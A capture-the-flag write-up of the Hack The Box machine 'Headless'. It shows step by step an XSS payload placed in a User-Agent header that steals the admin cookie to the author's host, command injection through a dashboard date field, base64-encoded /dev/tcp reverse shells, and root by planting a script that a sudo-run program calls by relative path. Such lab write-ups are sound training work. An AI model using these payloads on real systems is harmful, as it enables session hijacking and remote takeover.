---
title:  "HTB Headless Writeup"
date:   2024-07-20 00:30:00 
categories: HTB Machine
tags: XSS script_abuse command_injection
---

![Headless](/assets/img/Headless/GJNZ82aWIAEFj-T.png)

## Introduction 

The initial access was quite trivial but an interesting cross site scripting deliver using cross site scripting in requests headers. The privilege escalation method is also a very trivial but fun none the less. Its a quite easy box but quite interesting none the less.

If you like any of my content it would help a lot if you used my referral link to buy Hack The Box/Academy Subscriptions which you can find on my about page.

## Initial access
### Recon

To start off our recon we will begin with an Nmap scan of the machine. Using the following command:
```
sudo nmap -sS -A -p- -v -oN nmap 10.129.222.226
```
**Nmap**
```
# Nmap 7.94 scan initiated Tue Mar 26 12:57:12 2024 as: nmap -sS -A -p- -v -oN nmap 10.129.222.226
Nmap scan report for 10.129.222.226
Host is up (0.038s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 90:02:94:28:3d:ab:22:74:df:0e:a3:b2:0f:2b:c6:17 (ECDSA)
|_  256 2e:b9:08:24:02:1b:60:94:60:b3:84:a9:9e:1a:60:ca (ED25519)
5000/tcp open  upnp?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.2.2 Python/3.11.2
|     Date: Tue, 26 Mar 2024 16:57:29 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 2799
|     Set-Cookie: is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs; Path=/
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>Under Construction</title>
|     <style>
|     body {
|     font-family: 'Arial', sans-serif;
|     background-color: #f7f7f7;
|     margin: 0;
|     padding: 0;
|     display: flex;
|     justify-content: center;
|     align-items: center;
|     height: 100vh;
|     .container {
|     text-align: center;
|     background-color: #fff;
|     border-radius: 10px;
|     box-shadow: 0px 0px 20px rgba(0, 0, 0, 0.2);
|   RTSPRequest: 
|     <!DOCTYPE HTML>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: 400 - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port5000-TCP:V=7.94%I=7%D=3/26%Time=6602FE77%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,BE1,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/2\.2\.2\x20
SF:Python/3\.11\.2\r\nDate:\x20Tue,\x2026\x20Mar\x202024\x2016:57:29\x20GM
SF:T\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x2
SF:02799\r\nSet-Cookie:\x20is_admin=InVzZXIi\.uAlmXlTvm8vyihjNaPDWnvB_Zfs;
SF:\x20Path=/\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html\x20
SF:lang=\"en\">\n<head>\n\x20\x20\x20\x20<meta\x20charset=\"UTF-8\">\n\x20
SF:\x20\x20\x20<meta\x20name=\"viewport\"\x20content=\"width=device-width,
SF:\x20initial-scale=1\.0\">\n\x20\x20\x20\x20<title>Under\x20Construction
SF:</title>\n\x20\x20\x20\x20<style>\n\x20\x20\x20\x20\x20\x20\x20\x20body
SF:\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-family:\x20
SF:'Arial',\x20sans-serif;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20background-color:\x20#f7f7f7;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20margin:\x200;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20padding:\x200;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20displ
SF:ay:\x20flex;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20justify-c
SF:ontent:\x20center;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20ali
SF:gn-items:\x20center;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20h
SF:eight:\x20100vh;\n\x20\x20\x20\x20\x20\x20\x20\x20}\n\n\x20\x20\x20\x20
SF:\x20\x20\x20\x20\.container\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20text-align:\x20center;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20background-color:\x20#fff;\n\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20border-radius:\x2010px;\n\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20box-shadow:\x200px\x200px\x2020px\x20rgba\(0,\x200,\
SF:x200,\x200\.2\);\n\x20\x20\x20\x20\x20")%r(RTSPRequest,16C,"<!DOCTYPE\x
SF:20HTML>\n<html\x20lang=\"en\">\n\x20\x20\x20\x20<head>\n\x20\x20\x20\x2
SF:0\x20\x20\x20\x20<meta\x20charset=\"utf-8\">\n\x20\x20\x20\x20\x20\x20\
SF:x20\x20<title>Error\x20response</title>\n\x20\x20\x20\x20</head>\n\x20\
SF:x20\x20\x20<body>\n\x20\x20\x20\x20\x20\x20\x20\x20<h1>Error\x20respons
SF:e</h1>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20code:\x20400</p>\n\
SF:x20\x20\x20\x20\x20\x20\x20\x20<p>Message:\x20Bad\x20request\x20version
SF:\x20\('RTSP/1\.0'\)\.</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20
SF:code\x20explanation:\x20400\x20-\x20Bad\x20request\x20syntax\x20or\x20u
SF:nsupported\x20method\.</p>\n\x20\x20\x20\x20</body>\n</html>\n");
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94%E=4%D=3/26%OT=22%CT=1%CU=32521%PV=Y%DS=2%DC=T%G=Y%TM=6602FED
OS:E%P=x86_64-pc-linux-gnu)SEQ(SP=FF%GCD=1%ISR=104%TI=Z%CI=Z%II=I%TS=A)OPS(
OS:O1=M53AST11NW7%O2=M53AST11NW7%O3=M53ANNT11NW7%O4=M53AST11NW7%O5=M53AST11
OS:NW7%O6=M53AST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(
OS:R=Y%DF=Y%T=40%W=FAF0%O=M53ANNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=
OS:S)

Uptime guess: 15.648 days (since Sun Mar 10 21:26:13 2024)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=255 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 554/tcp)
HOP RTT      ADDRESS
1   33.03 ms 10.10.16.1
2   16.96 ms 10.129.222.226

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Mar 26 12:59:10 2024 -- 1 IP address (1 host up) scanned in 118.25 seconds
```
When reviewing the Nmap output we can see that this machine only had two ports open one being SSH and the other being port 5000 which hosted a web application. When browsing to this web application we could see a front page that refers to a support page where we would be able to ask questions.

![Headless](/assets/img/Headless/Headless_01.png)

When going to this support page i found out something interesting when supplying a Cross Site scripting payload in the message field. We'd get a message saying our message was malicious and a hacking attempt was detected

![Support page](/assets/img/Headless/Headless_02.png)


![Hacking attempt detected](/assets/img/Headless/Headless_03.png)

Seeing that the page said it was going to send my request headers to the administrator it occured to me that maybe i should do another xss payload inside one of the headers such as the user-agent. I then decided to put the same xss polyglot in the useragent to test if any of the alerts would render. I'd then capture the request and modify the useragent ending up with the following request.

```
POST /support HTTP/1.1
Host: 10.129.222.226:5000
User-Agent: jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 317
Origin: http://10.129.222.226:5000
Connection: close
Referer: http://10.129.222.226:5000/support
Cookie: is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs
Upgrade-Insecure-Requests: 1

fname=test&lname=test&email=test%40me.com&phone=test&message=jaVasCript%3A%2F*-%2F*%60%2F*%5C%60%2F*%27%2F*%22%2F**%2F%28%2F*+*%2FoNcliCk%3Dalert%28%29+%29%2F%2F%250D%250A%250d%250a%2F%2F%3C%2FstYle%2F%3C%2FtitLe%2F%3C%2FteXtarEa%2F%3C%2FscRipt%2F--%21%3E%5Cx3csVg%2F%3CsVg%2FoNloAd%3Dalert%28%29%2F%2F%3E%5Cx3e%0D%0A
```
The moment after this we'd get our alert to trigger on the page.

![Successfull xss](/assets/img/Headless/Headless_04.png)

### Hijacking admin token

So now that we have proof that we are able perform a cross site scripting attack we just have to upgrade our payload to then send the administrators cookie to us instead. After some experimenting i came up with the following javascript payload.

```js
const Http = new XMLHttpRequest();
const url='http://10.10.16.27/TEST?c='+document.cookie;
Http.open("GET", url);
Http.send();

Http.onreadystatechange = (e) => {
  console.log(Http.responseText)
}
```
After base64 encoding this command it would look like the following wrapped in our xss payload.
```html
<svg onload='eval(atob("Y29uc3QgSHR0cCA9IG5ldyBYTUxIdHRwUmVxdWVzdCgpOwpjb25zdCB1cmw9J2h0dHA6Ly8xMC4xMC4xNi4yNy9URVNUP2M9Jytkb2N1bWVudC5jb29raWU7Ckh0dHAub3BlbigiR0VUIiwgdXJsKTsKSHR0cC5zZW5kKCk7CgpIdHRwLm9ucmVhZHlzdGF0ZWNoYW5nZSA9IChlKSA9PiB7CiAgY29uc29sZS5sb2coSHR0cC5yZXNwb25zZVRleHQpCn0="));' 
```

Before we send this request we first need to setup our webserver, I did this python

```bash
python -m http.server 80
```

Next we sent the following request.

```
POST /support HTTP/1.1
Host: 10.129.222.226:5000
User-Agent: <svg onload='eval(atob("Y29uc3QgSHR0cCA9IG5ldyBYTUxIdHRwUmVxdWVzdCgpOwpjb25zdCB1cmw9J2h0dHA6Ly8xMC4xMC4xNi4yNy9URVNUP2M9Jytkb2N1bWVudC5jb29raWU7Ckh0dHAub3BlbigiR0VUIiwgdXJsKTsKSHR0cC5zZW5kKCk7CgpIdHRwLm9ucmVhZHlzdGF0ZWNoYW5nZSA9IChlKSA9PiB7CiAgY29uc29sZS5sb2coSHR0cC5yZXNwb25zZVRleHQpCn0="));' 
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 323
Origin: http://10.129.222.226:5000
Connection: close
Referer: http://10.129.222.226:5000/support
Cookie: is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs
Upgrade-Insecure-Requests: 1

fname=test&lname=test&email=test%40me.com&phone=test&message=jaVasCript%3A%2F*-%2F*%60%2F*%5C%60%2F*%27%2F*%22%2F**%2F%28%2F*+*%2FoNcliCk%3Dalert%28%29+%29%2F%2F%250D%250A%250d%250a%2F%2F%3C%2FstYle%2F%3C%2FtitLe%2F%3C%2FteXtarEa%2F%3C%2FscRipt%2F--%21%3E%5Cx3csVg%2F%3CsVg%2FoNloAd%3Dalert%28%29%2F%2F%3E%5Cx3e%0D%0A%0D%0A
```

A few moments later we'd get access to the Administrators cookies

![Token stolen](/assets/img/Headless/Headless_05.png)

Now we have access to an admin token but when loading this token in our browser we wouldn't get any hint of other pages we can go to. So i assumed that we had to discover these. I decided to run dirsearch on the webserver. This would result in me finding out that dashboard is also a valid url.

```bash 
dirsearch -u http://10.129.222.226:5000  -t 500 -r -f
```

![Dirsearch](/assets/img/Headless/Headless_06.png)

When browsing to this URL with our admin token we were able to access it while with our previous one we were not.

![Dashboard](/assets/img/Headless/Headless_07.png)

### Command execution

So now that we have access to this new page we can see it only has one functionality. While testing this functionality i found out it was vulnerable to command injection. i tested this by sending a simple curl command after a semi colon. After sending the following request i'd get a callback on my websever

```
POST /dashboard HTTP/1.1
Host: 10.129.222.226:5000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 49
Origin: http://10.129.222.226:5000
Connection: close
Referer: http://10.129.222.226:5000/dashboard
Cookie: is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0
Upgrade-Insecure-Requests: 1

date=2023-09-15; curl http://10.10.16.27/CODETEST
```

![Code execution](/assets/img/Headless/Headless_08.png)


So after this all we have to do is get a working reverse shell payload. To save me the hassle of messing with syntax i decided to base64 encode my command.

```bash
echo -n '/bin/bash -l > /dev/tcp/10.10.16.27/443 0<&1 2>&1' | base64

```

this command gave us the following B64 encoded string 

```bash
L2Jpbi9iYXNoIC1sID4gL2Rldi90Y3AvMTAuMTAuMTYuMjcvNDQzIDA8JjEgMj4mMQ==
```

Then using this B64 string our payload will look like this:

```bash
echo L2Jpbi9iYXNoIC1sID4gL2Rldi90Y3AvMTAuMTAuMTYuMjcvNDQzIDA8JjEgMj4mMQ== | base64 --decode | bash
```

So next we setup our reverse listener with netcat

```bash
nc -lnvp 443
```

Then we sent the following request. After sending this request we'd get a reverse shell as dvir user

```
POST /dashboard HTTP/1.1
Host: 10.129.222.226:5000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 115
Origin: http://10.129.222.226:5000
Connection: close
Referer: http://10.129.222.226:5000/dashboard
Cookie: is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0
Upgrade-Insecure-Requests: 1

date=2023-09-15; echo L2Jpbi9iYXNoIC1sID4gL2Rldi90Y3AvMTAuMTAuMTYuMjcvNDQzIDA8JjEgMj4mMQ== | base64 --decode | bash
```

![Code execution](/assets/img/Headless/Headless_09.png)

## Privilege escalation

First of all upgrade the current reverse shell to a more easy to use shell using python 

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Next i ran the command i always run first when landing on a machine sudo -l to check if this user is able to execute any commands as root. here we could see that the user was allowed to run **/usr/bin/syscheck** as root.

```bash
sudo -l 
```
![Dashboard](/assets/img/Headless/Headless_10.png)

So the first step would be to check out what this file is. Upon inspection it seems to be a bash script which we can check the contents of with the cat command

```bash
cat /usr/bin/syscheck
```

Looking through the script the attack vector becomes very clear. The script below calls **./initdb.sh** script from a relative path. This means we could just run this file from a location that doesn't have the file originally and then we just create our own with a reverse shell.

```bash
#!/bin/bash

if [ "$EUID" -ne 0 ]; then
  exit 1
fi

last_modified_time=$(/usr/bin/find /boot -name 'vmlinuz*' -exec stat -c %Y {} + | /usr/bin/sort -n | /usr/bin/tail -n 1)
formatted_time=$(/usr/bin/date -d "@$last_modified_time" +"%d/%m/%Y %H:%M")
/usr/bin/echo "Last Kernel Modification Time: $formatted_time"

disk_space=$(/usr/bin/df -h / | /usr/bin/awk 'NR==2 {print $4}')
/usr/bin/echo "Available disk space: $disk_space"

load_average=$(/usr/bin/uptime | /usr/bin/awk -F'load average:' '{print $2}')
/usr/bin/echo "System load average: $load_average"

if ! /usr/bin/pgrep -x "initdb.sh" &>/dev/null; then
  /usr/bin/echo "Database service is not running. Starting it..."
  ./initdb.sh 2>/dev/null
else
  /usr/bin/echo "Database service is running."
fi

exit 0
```

Run the following command to create our reverse shell in the initdb.sh file as well as making it executable

```bash
echo -n '/bin/bash -l > /dev/tcp/10.10.16.27/444 0<&1 2>&1' > initdb.sh
chmod +x 
```

Then after doing this we can setup our second listener this time on port 444

```bash 
nc -lnvp 444
```

After setting up our listener we could run the script as root. After a second we'd be greeted with a reverse shell as root.

```bash
sudo /usr/bin/syscheck
```
![Root access](/assets/img/Headless/Headless_11.png)

